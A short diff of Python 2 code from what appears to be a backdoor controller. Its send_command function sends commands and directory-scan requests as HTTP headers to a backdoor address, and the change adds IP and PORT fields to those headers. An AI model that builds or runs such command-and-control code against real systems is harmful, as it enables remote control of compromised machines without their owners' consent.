@@ -32,7 +32,7 @@ def send_command(action,command):
 		head="CMD"
 	if(action)=="scandir":
 		head="SCANDIR"
-	headers={head:command}
+	headers={head:command,"IP":ip,"PORT":port}
 	r =requests.get(adresse_backdoor,headers=headers)
 	print r
 
